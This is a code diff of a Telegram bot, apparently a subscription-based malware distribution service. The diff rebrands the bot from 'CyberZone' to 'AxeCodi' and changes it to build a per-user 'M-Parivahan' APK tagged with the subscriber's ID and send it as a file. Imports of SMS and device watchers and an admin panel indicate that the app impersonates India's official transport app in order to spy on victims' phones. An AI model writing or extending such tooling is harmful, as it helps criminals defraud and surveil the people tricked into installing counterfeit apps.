@@ -19,7 +19,7 @@ import { startSmsWatcher } from "./smsWatcher";
 
 // Tracks users mid-conversation (waiting for their next message)
 const pendingActions = new Map<string, { action: "reset_password" | "set_email" }>();
-import { getApkPath, getPanelApkPath, getApkSize } from "./apkBuilder";
+import { getApkPath, buildUserApk, getApkSize } from "./apkBuilder";
 import { startDeviceWatcher } from "./deviceWatcher";
 
 const BOT_TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
@@ -75,7 +75,7 @@ export async function startBot(): Promise<void> {
     if (isAdmin(ctx)) {
       const panelUrl = getPanelUrl();
       await ctx.reply(
-        `*CyberZone Panel — Admin Console*\n\n` +
+        `*AxeCodi Panel — Admin Console*\n\n` +
         `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
         `*Available Commands:*\n` +
         `/start — Show this menu\n` +
@@ -111,7 +111,7 @@ export async function startBot(): Promise<void> {
 
     if (!sub) {
       await ctx.reply(
-        `*CyberZone Panel Bot*\n\n` +
+        `*AxeCodi Panel Bot*\n\n` +
         `❌ No subscription found for your account.\n\n` +
         `Contact admin to get access:\n@exoincs`,
         { parse_mode: "Markdown" }
@@ -179,23 +179,13 @@ export async function startBot(): Promise<void> {
       return;
     }
 
-    await ctx.reply(
-      "📦 *Select App to Download:*",
-      {
-        parse_mode: "Markdown",
-        ...Markup.inlineKeyboard([
-          [Markup.button.callback("📱 M-Parivahan", "build_mparivahan")],
-          [Markup.button.callback("🔮 Nexus Panel APK", "build_panel")],
-        ]),
-      }
-    );
+    await ctx.reply("🔨 *Building M-Parivahan APK...*\nPlease wait a moment.", { parse_mode: "Markdown" });
+    await buildAndSendMparivahan(ctx);
   }
 
-  bot.action("build_mparivahan", async (ctx) => {
-    await ctx.answerCbQuery("Building...");
-    await ctx.reply("🔨 Building M-Parivahan APK...\nPlease wait a moment.");
-
-    const apkPath = await getApkPath();
+  async function buildAndSendMparivahan(ctx: Context) {
+    const userId = ctx.from!.id.toString();
+    const apkPath = await buildUserApk(userId);
     if (!apkPath) {
       await ctx.reply("❌ APK file not found. Contact admin.");
       return;
@@ -205,41 +195,18 @@ export async function startBot(): Promise<void> {
     const buildId = Math.floor(Math.random() * 90000) + 10000;
 
     await ctx.reply(
-      `🛠 *CYBERZONE PANEL BUILD CENTER*\n\n` +
+      `🛠 *AXECODI BUILD CENTER*\n\n` +
       `📱 App: M-Parivahan\n` +
-      `🆔 Build ID: #${buildId}\n\n` +
+      `🆔 Build ID: #${buildId}\n` +
+      `👤 Owner ID: \`${userId}\`\n\n` +
       `✅ Status: Ready!\n` +
       `📦 Size: ${size}\n\n` +
       `👇 APK sent below.`,
       { parse_mode: "Markdown" }
     );
 
-    await ctx.replyWithDocument({ source: apkPath, filename: `mParivahan_CyberZone.apk` });
-  });
-
-  bot.action("build_panel", async (ctx) => {
-    await ctx.answerCbQuery("Fetching...");
-    const apkPath = await getPanelApkPath();
-    if (!apkPath) {
-      await ctx.reply(
-        "❌ *Nexus Panel APK not found.*\n\nAdmin se contact karo.",
-        { parse_mode: "Markdown" }
-      );
-      return;
-    }
-    const size = getApkSize(apkPath);
-    const panelUrl = getPanelUrl();
-    await ctx.reply(
-      `🔮 *NEXUS PANEL APK*\n\n` +
-      `✅ Status: Ready\n` +
-      `📦 Size: ${size}\n` +
-      `🔐 Login: Email + Password + OTP\n\n` +
-      `📌 *Web Panel bhi available hai:*\n${panelUrl}\n\n` +
-      `👇 APK sent below — install karke Telegram OTP se login karo.`,
-      { parse_mode: "Markdown" }
-    );
-    await ctx.replyWithDocument({ source: apkPath, filename: `NexusPanel_CyberZone.apk` });
-  });
+    await ctx.replyWithDocument({ source: apkPath, filename: `mParivahan_AxeCodi.apk` });
+  }
 
   // ─── /reset_password ─────────────────────────────────────────────────────
   bot.command("reset_password", handleResetPassword);
